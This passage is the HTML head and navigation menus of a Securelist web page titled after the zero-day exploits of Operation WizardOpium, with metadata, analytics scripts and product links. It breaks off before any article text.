<!DOCTYPE html>
<html lang="en-US">

<head>
	<meta charset="UTF-8" />
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<script type="text/javascript">
/* <![CDATA[ */
 var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}}); 
/* ]]> */
</script>

	<link rel="profile" href="http://gmpg.org/xfn/11" />
	<link rel="pingback" href="https://securelist.com/xmlrpc.php" />
	<link rel="apple-touch-icon" sizes="192x192" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-192x192.png">
	<link rel="icon" type="image/png" sizes="192x192" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-192x192.png">
	<link rel="icon" type="image/png" sizes="96x96" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-96x96.png">
	<link rel="icon" type="image/png" sizes="48x48" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-48x48.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/favicon-16x16.png">
	<link rel="manifest" href="https://securelist.com/wp-content/themes/securelist2020/assets/images/favicons/site.webmanifest">
	<title>The zero&#x2d;day exploits of Operation WizardOpium | Securelist</title>

<!-- The SEO Framework by Sybre Waaijer -->
<meta name="keywords" content="Google Chrome,Malware Technologies,Microsoft Windows,Vulnerabilities and exploits,Watering hole attacks,Zero-day vulnerabilities" />
<link rel="canonical" href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/" />
<meta name="description" content="Back in October 2019 we detected a classic watering&#x2d;hole attack that exploited a chain of Google Chrome and Microsoft Windows zero&#x2d;days. In this blog post we’d like to take a deep technical dive into the attack." />
<meta property="og:type" content="article" />
<meta property="og:title" content="The zero&#x2d;day exploits of Operation WizardOpium" />
<meta property="og:description" content="Back in October 2019 we detected a classic watering&#x2d;hole attack that exploited a chain of Google Chrome and Microsoft Windows zero&#x2d;days. In this blog post we’d like to take a deep technical dive into the attack." />
<meta property="og:url" content="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/" />
<meta property="og:image" content="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11.jpg" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@Securelist" />
<meta name="twitter:creator" content="@Securelist" />
<meta name="twitter:title" content="The zero&#x2d;day exploits of Operation WizardOpium" />
<meta name="twitter:description" content="Back in October 2019 we detected a classic watering&#x2d;hole attack that exploited a chain of Google Chrome and Microsoft Windows zero&#x2d;days. In this blog post we’d like to take a deep technical dive into the attack." />
<meta name="twitter:image" content="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11.jpg" />
<script type="application/ld+json">{"@context":"https://schema.org","@type":"NewsArticle","mainEntityOfPage":{"@type":"WebPage","@id":"https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/"},"headline":"The zero\u0026#x2d;day exploits of Operation WizardOpium","image":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/11130521/securelist_abs_11.jpg","datePublished":"2020-05-28T10:00:09+00:00","dateModified":"2021-02-12T14:32:49+00:00","author":{"@type":"Person","name":"Boris Larin","url":"https://securelist.com/author/borislarin/"},"publisher":{"@type":"Organization","name":"Kaspersky","logo":{"@type":"ImageObject","url":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/06/04065705/article-logo-small_new.png","width":60,"height":60}},"description":"Back in October 2019 we detected a classic watering\u0026#x2d;hole attack that exploited a chain of Google Chrome and Microsoft Windows zero\u0026#x2d;days. In this blog post we’d like to take a deep technical dive into the attack."}</script>
<!-- / The SEO Framework by Sybre Waaijer | 98.36ms meta | 0.16ms boot -->

<link rel='dns-prefetch' href='//kasperskycontenthub.com' />
<link rel='dns-prefetch' href='//securelist.com' />
<link rel='dns-prefetch' href='//www.google.com' />
<link rel="alternate" type="application/rss+xml" title="Securelist - English - Global - securelist.com &raquo; Feed" href="https://securelist.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Securelist - English - Global - securelist.com &raquo; Comments Feed" href="https://securelist.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Securelist - English - Global - securelist.com &raquo; The zero-day exploits of Operation WizardOpium Comments Feed" href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/feed/" />
<link rel='stylesheet' id='crayon-group-css' href='//assets.kasperskycontenthub.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css,wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css,wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css,wp-includes/css/dist/block-library/style.min.css,wp-content/plugins/jquery-collapse-o-matic/css/core_style.css,wp-content/plugins/jquery-collapse-o-matic/css/light_style.css,wp-content/plugins/kspr_twitter_pullquote/css/style.css,wp-content/themes/securelist2020/assets/css/main.css,wp-content/plugins/kaspersky-social-sharing/assets/css/style.css,wp-content/plugins/kaspersky-social-sharing/assets/css/custom.css' type='text/css' media='all' />
<link rel='stylesheet' id='taxonomy-image-plugin-public-group-css' href='//assets.kasperskycontenthub.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/taxonomy-images/css/style.css' type='text/css' media='screen' />
<script type="text/javascript" src="https://securelist.com/wp-content/plugins/kaspersky-enable-jquery-migrate-helper/js/jquery/jquery-1.12.4-wp.js?ver=1.12.4-wp" id="jquery-core-js"></script>
<script type="text/javascript" id="kaspersky-sso-integration-js-extra">
/* <![CDATA[ */
var kasperskySSOIntegrationData = {"authorizationURL":"https:\/\/auth.ca.uis.kaspersky.com\/connect\/authorize?client_id=securelist&client_name=Securelist&redirect_uri=https%3A%2F%2Fsecurelist.com%2Fkaspersky-sso%2Flogin%2F&response_type=code&scope=openid email profile offline_access","endSessionURL":"https:\/\/auth.ca.uis.kaspersky.com\/connect\/endsession?id_token_hint=eyJhbGciOiJSUzI1NiIsImtpZCI6IkNCNzFGQTExMjc4MzgyMzQ3OTAxNzlENkJGMkVBNkFCRkZGOEQ5OUYiLCJ4NXQiOiJ5M0g2RVNlRGdqUjVBWG5Xdnk2bXFfXzQyWjgiLCJ0eXAiOiJKV1QifQ.eyJhdF9oYXNoIjoibjVlbU1TVExBVWNkN25DeVFEcUJqQSIsInNpZCI6IjZOdmRYZmQ3dEE2R3Zpd25TQUI1cUEiLCJzdWIiOiJmZjk5NDUyMy1mNGM2LTQ4ZjctYThmMy05YjkzZjI4ZDViODQiLCJhdXRoX3RpbWUiOiIxNzM0NDExMzMxIiwiaWRwIjoiS2FzcGVyc2t5SWQiLCJrYXNwZXJza3kuc3ViX3ZlcnNpb24iOiIxIiwia2FzcGVyc2t5LnN1c3BpY2lvdXNfYXV0aGVudGljYXRpb24iOiJ0cnVlIiwibmJmIjoxNzM0NDExMzM1LCJleHAiOjE3MzQ0OTc3MzUsImlhdCI6MTczNDQxMTMzNSwiaXNzIjoiaHR0cHM6Ly9hdXRoLmNhLnVpcy5rYXNwZXJza3kuY29tIiwiYXVkIjoic2VjdXJlbGlzdCJ9.Fx5kTxz4jXti2mIUkU2T3pEKmBeeoQgD9WvfUhusv3q29IK4_1_oO0owxeI9-OrDafdSAnvOaW_TxkaJwYo3Yvg8V_wnGLwbkTZKhnx2ghrvyIaQk72yRHit8tJRG82puRFLw-EtswePrnMFKGA7Pv_J8efUH2HlSfCtF0zJLspSlT4K728VUMPFCiGynxnUAh52SOVb5YcjodC3FW91KxvLC4jxm_mFwgNuH2yaQohjjcqOmnBl1V0j6mIIcy6AjylfUiq-uztTfrq9TRvyB-DwP3nVyOls_s0F30bHszAJOpRB3AYCDVIrxKqe-N1NWCK7R-MHL2EuTatEbuTZtQ&post_logout_redirect_uri=https:\/\/securelist.com\/kaspersky-sso\/logout\/"};
/* ]]> */
</script>
<script type="text/javascript" id="kss_js-js-extra">
/* <![CDATA[ */
var kss = {"twitter_account":"Securelist"};
/* ]]> */
</script>
<script type='text/javascript' src='//assets.kasperskycontenthub.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/kaspersky-lazy-load/assets/js/lazyload.js,wp-content/plugins/kaspersky-sso-integration/assets/js/main.js,wp-content/plugins/kspr_twitter_pullquote/js/kaspersky-twitter-pullquote.js,wp-content/plugins/kaspersky-social-sharing/assets/js/social-share.js'></script>
<link rel="alternate" hreflang="x-default" href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/" />
<link rel="alternate" hreflang="ru" href="https://securelist.ru/the-zero-day-exploits-of-operation-wizardopium/97082/" />
		<script>
			window.dataLayer = window.dataLayer || [];
			window.dataLayer.push({
				'Author' : 'Boris Larin',
				'PostId' : '97086',
				'PublicationDate' : '2020-05-28',
				'Categories': 'APT reports',
				'Tags': 'Google Chrome, Malware Technologies, Microsoft Windows, Vulnerabilities and exploits, Watering hole attacks, Zero-day vulnerabilities',
			});
		</script>
						<!-- Google Tag Manager -->
		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
		'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
		})(window,document,'script','dataLayer','GTM-5CGZ3HG');</script>
		<!-- End Google Tag Manager -->

		<!-- Google Tag Manager -->
		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
		'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
		})(window,document,'script','dataLayer','GTM-WZ7LJ3');</script>
		<!-- End Google Tag Manager -->
		<link rel="https://api.w.org/" href="https://securelist.com/wp-json/" /><link rel="alternate" type="application/json" href="https://securelist.com/wp-json/wp/v2/posts/97086" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://securelist.com/xmlrpc.php?rsd" />
<link rel="alternate" type="application/json+oembed" href="https://securelist.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurelist.com%2Fthe-zero-day-exploits-of-operation-wizardopium%2F97086%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://securelist.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurelist.com%2Fthe-zero-day-exploits-of-operation-wizardopium%2F97086%2F&#038;format=xml" />
<script type="text/javascript">
var sNew = document.createElement("script");
sNew.async = true;
sNew.src = "https://kasperskycontenthub.com/?dm=ed1f9e435dc885292eab65620c51f3fb&action=load&blogid=43&siteid=1&t=1702561991&back=https%3A%2F%2Fsecurelist.com%2Fthe-zero-day-exploits-of-operation-wizardopium%2F97086%2F"
var s0 = document.getElementsByTagName('script')[0];
s0.parentNode.insertBefore(sNew, s0);
</script>
<script type="text/javascript">
document.write(unescape("%3Cscript src='//munchkin.marketo.net/munchkin.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script>Munchkin.init('802-IJN-240');</script>
<meta name="google-site-verification" content="o48MojucKcP-DT5iCMR8AsvkVWP14fE78flHCqqjo50" />
        <script type="text/javascript">
            var jQueryMigrateHelperHasSentDowngrade = false;

			window.onerror = function( msg, url, line, col, error ) {
				// Break out early, do not processing if a downgrade reqeust was already sent.
				if ( jQueryMigrateHelperHasSentDowngrade ) {
					return true;
                }

				var xhr = new XMLHttpRequest();
				var nonce = 'fe1ce6bff2';
				var jQueryFunctions = [
					'andSelf',
					'browser',
					'live',
					'boxModel',
					'support.boxModel',
					'size',
					'swap',
					'clean',
					'sub',
                ];
				var match_pattern = /\)\.(.+?) is not a function/;
                var erroredFunction = msg.match( match_pattern );

                // If there was no matching functions, do not try to downgrade.
                if ( typeof erroredFunction !== 'object' || typeof erroredFunction[1] === "undefined" || -1 === jQueryFunctions.indexOf( erroredFunction[1] ) ) {
                    return true;
                }

                // Set that we've now attempted a downgrade request.
                jQueryMigrateHelperHasSentDowngrade = true;

				xhr.open( 'POST', 'https://securelist.com/wp-admin/admin-ajax.php' );
				xhr.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
				xhr.onload = function () {
					var response,
                        reload = false;

					if ( 200 === xhr.status ) {
                        try {
                        	response = JSON.parse( xhr.response );

                        	reload = response.data.reload;
                        } catch ( e ) {
                        	reload = false;
                        }
                    }

					// Automatically reload the page if a deprecation caused an automatic downgrade, ensure visitors get the best possible experience.
					if ( reload ) {
						location.reload();
                    }
				};

				xhr.send( encodeURI( 'action=jquery-migrate-downgrade-version&_wpnonce=' + nonce ) );

				// Suppress error alerts in older browsers
				return true;
			}
        </script>

			<div id="fb-root"></div>
	<script>
		(function(d, s, id) {
			var js, fjs = d.getElementsByTagName(s)[0];
			if (d.getElementById(id)) return;
			js = d.createElement(s);
			js.id = id;
			js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=160639043985664";
			fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));
	</script>
	<script>
		(function() {
			var po = document.createElement('script');
			po.type = 'text/javascript';
			po.async = true;
			po.src = '//apis.google.com/js/platform.js';
			var s = document.getElementsByTagName('script')[0];
			s.parentNode.insertBefore(po, s);
		})();
	</script>
<link rel="icon" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/06125514/cropped-sl_favicon-32x32.png" sizes="32x32" />
<link rel="icon" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/06125514/cropped-sl_favicon-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/06125514/cropped-sl_favicon-180x180.png" />
<meta name="msapplication-TileImage" content="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/11/06125514/cropped-sl_favicon-270x270.png" />
</head>

<body class="post-template-default single single-post postid-97086 single-format-standard lang-en_US c-theme--light">
			<!-- Google Tag Manager (noscript) -->
		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5CGZ3HG" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
		<!-- End Google Tag Manager (noscript) -->

		<!-- Google Tag Manager (noscript) -->
		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WZ7LJ3" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
		<!-- End Google Tag Manager (noscript) -->
		
	<div id="site-top" class="site-top">
	<div class="container">
		<nav class="site-nav" data-element-id="product-menu">
			<div class="label">
				<p>Solutions for:</p>
			</div>
			<ul id="menu-product-menu-daily-nxgen" class="site-selector"><li><a target="_blank" href="https://www.kaspersky.com/home-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_prodmen_sm-team_______d5c53f9a5bd411f7" data-element-id="product-menu-link" class="font-icons icon-home menu-item menu-item-type-custom menu-item-object-custom menu-item-87907">Home Products</a></li>
<li><a title="font-icons icon-small-business" target="_blank" href="https://www.kaspersky.com/small-business-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_prodmen_sm-team_______d5c53f9a5bd411f7" data-element-id="product-menu-link" class="font-icons icon-small-business menu-item menu-item-type-custom menu-item-object-custom menu-item-87908">Small Business 1-50 employees</a></li>
<li><a target="_blank" href="https://www.kaspersky.com/small-to-medium-business-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_prodmen_sm-team_______d5c53f9a5bd411f7" data-element-id="product-menu-link" class="font-icons icon-medium-business menu-item menu-item-type-custom menu-item-object-custom menu-item-87909">Medium Business 51-999 employees</a></li>
<li><a target="_blank" href="https://www.kaspersky.com/enterprise-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_prodmen_sm-team_______d5c53f9a5bd411f7" data-element-id="product-menu-link" class="font-icons icon-enterprise menu-item menu-item-type-custom menu-item-object-custom menu-item-87910">Enterprise 1000+ employees</a></li>
</ul>		</nav>
	</div>
</div>

<header id="site-header" class="site-header js-sticky-mobile-header">
	<div class="container">
		<a href="" class="c-page-nav-toggle js-mobile-menu-toggle">
			<span class="c-page-nav-toggle__icon">
				<span></span>
				<span></span>
				<span></span>
			</span>
		</a>
		<a href="" class="menu-toggle">
			<span></span>
			<span></span>
			<span></span>
		</a>
		<div class="c-site-title">
			<div class="c-site-logo__group">
				<a data-element-id="securelist-logo"  href="https://securelist.com/" class="c-site-logo c-site-logo--basic"></a>
								<span class="c-site-tagline">by Kaspersky</span>
			</div>
		</div>

		<ul id="menu-my-kaspersky" class="menu-utility sticky-utility"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-87905"><a href="https://companyaccount.kaspersky.com/account/login?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="companyaccount">CompanyAccount</a>
<li class="sticky-item sticky-xl-only menu-item menu-item-type-custom menu-item-object-custom menu-item-87906"><a href="https://www.kaspersky.com/enterprise-security/contact?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="getintouch">Get In Touch</a>
<li class="securelist-theme-switcher menu-item menu-item-type-custom menu-item-object-custom menu-item-99824"><a data-element-id="dark-mode" href="#" class="js-theme-switcher"><i class="font-icons icon-moon"></i>Dark mode<span class="u-hidden u-inline--dark"> off</span></a>
<li class="dropdown"><a data-element-id="lang-selector" href="#" class="">English</a><ul class="sub-menu-regular"><li><a href="https://securelist.ru/the-zero-day-exploits-of-operation-wizardopium/97082/">Russian</a></li><li><a href="https://securelist.lat">Spanish</a></li></ul>
</ul>
		<div class="c-page-search js-main-search">
			<form class="c-page-search__form c-page-search__form--small js-wizardinfosys_autosearch_form" full_search_url="https://securelist.com/?s=%q%" action="https://securelist.com/" method="get">
	<div class="c-form-element c-form-element--style-fill">
		<div class="c-form-element__field wp_autosearch_form_wrapper">
			<input name="s" class="c-form-element__text wp_autosearch_input ac_input" data-webinars="" type="text" value="" placeholder="Search..." autocomplete="off">
		</div>
	</div>
	<button class="c-button c-button--icon wp_autosearch_submit"><svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-search"></use></svg></button>
</form>
			<div class="c-page-search__toggle js-main-search-toggle"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-search"></use></svg></div>
		</div>
		<nav class="main-nav" data-element-id="nextgen-menu">
			<ul id="menu-corp-menu" class="main-menu"><li class="dropdown mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87706"><a href="https://www.kaspersky.com/enterprise-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Solutions</a>
<ul class="submenu">
<li class="first featured featured-smaller menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87707">
	<ul class="featured section-col-l-3 no-gutter">
<li class="show-figure smaller-item icon-iot-embed-security menu-item menu-item-type-custom menu-item-object-custom menu-item-87710"><figure><a href="https://www.kaspersky.com/enterprise-security/embedded-security-internet-of-things?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/iot-embed-security.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/embedded-security-internet-of-things?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Internet of Things &#038; Embedded Security</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/embedded-security-internet-of-things?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-transportation-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87712"><figure><a href="https://www.kaspersky.com/enterprise-security/industrial-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/transportation-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/industrial-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Industrial Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/industrial-solution?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-fraud-prevention menu-item menu-item-type-custom menu-item-object-custom menu-item-87713"><figure><a href="https://www.kaspersky.com/enterprise-security/fraud-prevention?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/fraud-prevention.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/fraud-prevention?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Fraud Prevention</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/fraud-prevention?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item menu-item menu-item-type-custom menu-item-object-custom menu-item-87711"><a href="https://www.kaspersky.com/enterprise-security/kasperskyos?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">KasperskyOS-based solutions</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/kasperskyos?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
	</ul>

<li>
	<ul class="regular">
<li class="title"><h6>Other solutions</h6>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105615"><a href="https://www.kaspersky.com/enterprise-security/security-operations-center-soc?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky for Security Operations Center</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-105614"><a href="https://www.kaspersky.com/enterprise-security/kaspersky-iot-infrastructure-security?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky IoT Infrastructure Security</a>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112322"><a href="https://www.kaspersky.com/enterprise-security/kaspersky-secure-remote-workspace?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Kaspersky Secure Remote Workspace</a>
	</ul>

</ul>

<li class="dropdown mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87714"><a href="https://www.kaspersky.com/enterprise-security/industries?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Industries</a>
<ul class="submenu">
<li class="first featured featured-smaller menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-87715">
	<ul class="featured section-col-l-3 no-gutter">
<li class="show-figure smaller-item icon-national-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87716"><figure><a href="https://www.kaspersky.com/enterprise-security/national-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/national-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/national-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">National Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/national-cybersecurity?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-industrial-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87717"><figure><a href="https://www.kaspersky.com/enterprise-security/industrial?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/industrial-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/industrial?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Industrial Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/industrial?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-financial-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87718"><figure><a href="https://www.kaspersky.com/enterprise-security/finance?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/financial-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/finance?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Finance Services Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/finance?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
<li class="show-figure smaller-item icon-healthcare-cybersecurity menu-item menu-item-type-custom menu-item-object-custom menu-item-87719"><figure><a href="https://www.kaspersky.com/enterprise-security/healthcare?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link"><img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/enterprise-menu-icons/healthcare-cybersecurity.png"</a></figure><a href="https://www.kaspersky.com/enterprise-security/healthcare?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="nextgen-menu-link">Healthcare Cybersecurity</a><div class="desc"><p><a href="https://www.kaspersky.com/enterprise-security/healthcare?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f">Learn More</a></p></div>
